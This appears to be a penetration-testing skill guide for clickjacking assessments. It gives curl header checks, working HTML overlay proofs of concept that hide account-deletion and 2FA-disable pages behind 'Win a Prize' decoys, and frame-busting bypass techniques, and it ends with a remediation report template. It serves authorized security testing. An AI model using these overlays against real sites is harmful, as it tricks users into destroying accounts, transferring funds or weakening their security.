---
name: performing-clickjacking-attack-test
description: Testing web applications for clickjacking vulnerabilities by assessing frame embedding controls and crafting proof-of-concept overlay attacks during authorized security assessments.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, clickjacking, ui-redressing, web-security, owasp, x-frame-options]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Clickjacking Attack Test

## When to Use

- During authorized penetration tests when assessing UI redressing vulnerabilities
- When testing whether sensitive actions (delete account, transfer funds, change settings) can be performed via clickjacking
- For evaluating the effectiveness of X-Frame-Options and Content-Security-Policy frame-ancestors directives
- When assessing applications that process one-click actions without additional confirmation
- During security audits of applications handling financial transactions or account management

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Web browser**: Modern browser for testing iframe embedding
- **Local web server**: Python `http.server` or similar for hosting PoC pages
- **Burp Suite**: For examining response headers
- **HTML/CSS knowledge**: For crafting clickjacking overlay pages
- **curl**: For checking framing headers on target pages

## Workflow

### Step 1: Check Frame Embedding Protections

Examine response headers for anti-clickjacking defenses.

```bash
# Check X-Frame-Options header
curl -s -I "https://target.example.com/" | grep -i "x-frame-options"
# Expected values:
# X-Frame-Options: DENY (blocks all framing)
# X-Frame-Options: SAMEORIGIN (allows same-origin framing)
# X-Frame-Options: ALLOW-FROM https://trusted.com (deprecated, limited support)

# Check Content-Security-Policy frame-ancestors directive
curl -s -I "https://target.example.com/" | grep -i "content-security-policy"
# Look for: frame-ancestors 'none' or frame-ancestors 'self'
# frame-ancestors 'none' = equivalent to DENY
# frame-ancestors 'self' = equivalent to SAMEORIGIN

# Test multiple sensitive pages
for page in / /account/settings /account/delete /transfer \
  /admin/dashboard /change-password /change-email; do
  echo -n "$page: "
  headers=$(curl -s -I "https://target.example.com$page")
  xfo=$(echo "$headers" | grep -i "x-frame-options" | tr -d '\r')
  csp=$(echo "$headers" | grep -i "content-security-policy" | grep -o "frame-ancestors[^;]*" | tr -d '\r')
  if [ -z "$xfo" ] && [ -z "$csp" ]; then
    echo "NO PROTECTION"
  else
    echo "${xfo:-none} | ${csp:-none}"
  fi
done

# Check if JavaScript frame-busting is used (weak protection)
curl -s "https://target.example.com/" | grep -i "top.location\|parent.location\|frameElement"
```

### Step 2: Test Basic Iframe Embedding

Attempt to embed the target page in an iframe to confirm vulnerability.

```html
<!-- basic-frame-test.html -->
<html>
<head><title>Clickjacking Frame Test</title></head>
<body>
<h1>Frame Embedding Test</h1>
<p>If the target page loads below, it is vulnerable to clickjacking.</p>

<!-- Test basic framing -->
<iframe src="https://target.example.com/account/settings"
        width="800" height="600"
        style="border: 2px solid red;">
</iframe>

<p>If you see "Refused to display" in console or blank iframe,
   the page has frame protection.</p>
</body>
</html>
```

```bash
# Host the test page
cd /tmp
cat > frame-test.html << 'EOF'
<html>
<body>
<h1>Clickjacking Test</h1>
<iframe src="https://target.example.com/account/settings"
        width="800" height="600"></iframe>
</body>
</html>
EOF
python3 -m http.server 8888
# Open http://localhost:8888/frame-test.html in browser
# Check browser console for framing errors
```

### Step 3: Craft Clickjacking Proof of Concept

Build an overlay attack that tricks users into clicking hidden elements.

```html
<!-- clickjacking-poc.html -->
<html>
<head>
<title>Win a Prize!</title>
<style>
  body {
    margin: 0;
    padding: 0;
    font-family: Arial, sans-serif;
  }

  /* Invisible iframe containing target page */
  #target-frame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.0001;  /* Nearly invisible */
    z-index: 2;       /* On top of decoy */
    border: none;
  }

  /* Decoy content that tricks the user */
  #decoy {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    background: white;
  }

  /* Position the "Click here" button exactly over the target's
     sensitive button (adjust top/left values based on target layout) */
  #click-bait {
    position: absolute;
    top: 350px;    /* Align with target's "Delete Account" button */
    left: 400px;   /* Align horizontally */
    padding: 15px 30px;
    background: #4CAF50;
    color: white;
    font-size: 18px;
    cursor: pointer;
    border: none;
    border-radius: 5px;
  }
</style>
</head>
<body>

<!-- Decoy content visible to the user -->
<div id="decoy">
  <h1 style="text-align:center; margin-top:100px;">
    Congratulations! You Won!
  </h1>
  <p style="text-align:center;">
    Click the button below to claim your prize
  </p>
  <button id="click-bait">CLAIM PRIZE</button>
</div>

<!-- Hidden iframe with target's sensitive action -->
<iframe id="target-frame"
  src="https://target.example.com/account/delete"
  scrolling="no">
</iframe>

</body>
</html>
```

### Step 4: Create Multi-Step Clickjacking Attack

For actions requiring multiple clicks, create a multi-step overlay.

```html
<!-- multi-step-clickjacking.html -->
<html>
<head>
<title>Complete Survey</title>
<style>
  #target-frame {
    position: absolute;
    width: 100%;
    height: 100%;
    opacity: 0.0001;
    z-index: 2;
    border: none;
  }
  #step-container {
    text-align: center;
    margin-top: 200px;
    z-index: 1;
    position: relative;
  }
  .step { display: none; }
  .step.active { display: block; }
  .btn {
    padding: 15px 40px;
    font-size: 18px;
    background: #2196F3;
    color: white;
    border: none;
    cursor: pointer;
    margin-top: 20px;
  }
</style>
</head>
<body>

<div id="step-container">
  <!-- Step 1: Click aligns with "Settings" link on target -->
  <div class="step active" id="step1">
    <h2>Step 1: Select your reward</h2>
    <button class="btn" onclick="nextStep()"
      style="position:absolute; top:200px; left:300px;">
      Gold Package
    </button>
  </div>

  <!-- Step 2: Click aligns with "Delete Account" button -->
  <div class="step" id="step2">
    <h2>Step 2: Confirm your choice</h2>
    <button class="btn" onclick="nextStep()"
      style="position:absolute; top:350px; left:400px;">
      Confirm
    </button>
  </div>

  <!-- Step 3: Click aligns with "Yes, I'm sure" confirmation -->
  <div class="step" id="step3">
    <h2>Step 3: Claim reward!</h2>
    <button class="btn"
      style="position:absolute; top:400px; left:450px;">
      Claim Now!
    </button>
  </div>
</div>

<iframe id="target-frame"
  src="https://target.example.com/account/settings">
</iframe>

<script>
var currentStep = 1;
function nextStep() {
  document.getElementById('step' + currentStep).classList.remove('active');
  currentStep++;
  document.getElementById('step' + currentStep).classList.add('active');
  // Optionally change iframe src for multi-page flows
}
</script>
</body>
</html>
```

### Step 5: Test Frame-Busting Bypass Techniques

If JavaScript-based frame protection is used, attempt to bypass it.

```html
<!-- Bypass frame-busting JavaScript -->

<!-- Technique 1: sandbox attribute blocks top-level navigation -->
<iframe src="https://target.example.com/account/settings"
  sandbox="allow-scripts allow-forms allow-same-origin"
  width="800" height="600">
</iframe>
<!-- sandbox without allow-top-navigation prevents frame-busting -->

<!-- Technique 2: Double framing -->
<!-- If target checks: if (top !== self) top.location = self.location -->
<!-- Frame the page through an intermediate page that also frames -->
<iframe src="intermediate.html" width="800" height="600"></iframe>
<!-- intermediate.html contains: <iframe src="https://target.example.com/..."> -->

<!-- Technique 3: Intercept onbeforeunload -->
<script>
window.onbeforeunload = function() {
  return "Are you sure?";  // Prevents navigation away
};
</script>
<iframe src="https://target.example.com/account/settings"
  width="800" height="600">
</iframe>

<!-- Technique 4: Using data: URI or about:blank -->
<iframe id="f" src="about:blank" width="800" height="600"></iframe>
<script>
var iframe = document.getElementById('f');
iframe.contentDocument.write(
  '<iframe src="https://target.example.com/account/settings" width="100%" height="100%"></iframe>'
);
</script>
```

### Step 6: Validate Impact and Document Finding

Confirm that the clickjacking leads to meaningful impact.

```bash
# Host the PoC and test the attack flow
cd /tmp
python3 -m http.server 8888

# Testing steps:
# 1. Log in to target.example.com in the browser
# 2. Open http://localhost:8888/clickjacking-poc.html
# 3. Click the decoy button
# 4. Verify the sensitive action was performed on the target

# For report: adjust iframe opacity to show overlap
# Change opacity from 0.0001 to 0.5 for screenshot evidence
# This shows the target page visible behind the decoy content

# Document which sensitive actions are vulnerable:
# - Account deletion
# - Password/email change
# - Fund transfer
# - Permission/role changes
# - Enabling/disabling security features
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Clickjacking** | UI redressing attack that tricks users into clicking hidden elements by overlaying decoy content |
| **X-Frame-Options** | HTTP header controlling whether a page can be embedded in iframes (DENY, SAMEORIGIN) |
| **frame-ancestors** | CSP directive specifying valid parents for iframe embedding (supersedes X-Frame-Options) |
| **Frame Busting** | JavaScript-based defense that attempts to break out of iframes (easily bypassable) |
| **Likejacking** | Clickjacking variant targeting social media "Like" or "Share" buttons |
| **Cursorjacking** | Variant using CSS to offset the visible cursor from the actual click position |
| **Multi-step Clickjacking** | Attack requiring multiple clicks, with decoy content changing at each step |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Examining X-Frame-Options and CSP headers on responses |
| **Clickjack Tester (browser)** | Browser-based iframe embedding test tool |
| **Browser DevTools** | Inspecting frame embedding behavior and console errors |
| **Python http.server** | Hosting clickjacking PoC pages locally |
| **OWASP ZAP** | Automated detection of missing anti-framing headers |
| **securityheaders.com** | Online scanner for missing security headers |

## Common Scenarios

### Scenario 1: Account Deletion via Clickjacking
The account deletion page at `/account/delete` has no X-Frame-Options header. An attacker creates a page with a "Win a prize" button positioned over the "Delete My Account" button in a transparent iframe.

### Scenario 2: One-Click Fund Transfer
A banking application performs transfers via a single button click on a pre-filled form. Without frame protection, the attacker embeds the transfer page in an iframe and overlays a decoy "Play Game" button.

### Scenario 3: 2FA Disable via Multi-Step Clickjacking
Disabling two-factor authentication requires two clicks (settings link, then disable button). A multi-step clickjacking PoC guides the victim through two decoy clicks that align with the real buttons.

### Scenario 4: OAuth Authorization Clickjack
An OAuth consent screen allows framing. The attacker embeds the consent page and tricks the victim into clicking "Authorize", granting the attacker's application access to the victim's account.

## Output Format

```
## Clickjacking Vulnerability Finding

**Vulnerability**: Clickjacking - Missing Frame Embedding Protection
**Severity**: Medium (CVSS 6.1)
**Location**: /account/settings, /account/delete, /transfer
**OWASP Category**: A04:2021 - Insecure Design

### Headers Analysis
| Page | X-Frame-Options | CSP frame-ancestors | Vulnerable |
|------|----------------|--------------------|-|
| / | Not set | Not set | Yes |
| /account/settings | Not set | Not set | Yes |
| /account/delete | Not set | Not set | Yes |
| /transfer | Not set | Not set | Yes |
| /login | SAMEORIGIN | - | No |

### Sensitive Actions Exploitable
1. Account deletion (single click, no re-authentication)
2. Email change (single click, no confirmation)
3. 2FA disable (two clicks, multi-step PoC)
4. Fund transfer (pre-filled form, single click)

### Impact
- Account takeover via email change clickjacking
- Account destruction via delete clickjacking
- Financial loss via transfer clickjacking
- Security downgrade via 2FA disable clickjacking

### Recommendation
1. Add `Content-Security-Policy: frame-ancestors 'none'` to all pages
2. Set `X-Frame-Options: DENY` as fallback for older browsers
3. Require re-authentication for sensitive actions (delete, transfer)
4. Add confirmation dialogs that cannot be pre-filled or auto-submitted
5. Implement SameSite=Strict cookies to reduce session availability in frames
```
